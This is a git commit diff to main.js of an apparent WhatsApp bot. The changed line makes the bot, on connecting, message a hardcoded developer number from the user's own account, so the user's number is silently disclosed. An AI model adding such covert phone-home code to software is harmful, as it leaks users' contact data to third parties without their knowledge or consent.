d210be64cf38854e5471ae40f45cfcd74642987e
Awais <86798344+AwaisKhokhar705@users.noreply.github.com>
2022-03-18 04:40:43 +0500

    Update main.js

--- main.js
+++ main.js
@@ -55,7 +55,7 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`,  MessageType.extendedText)
+    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
     teks = ``
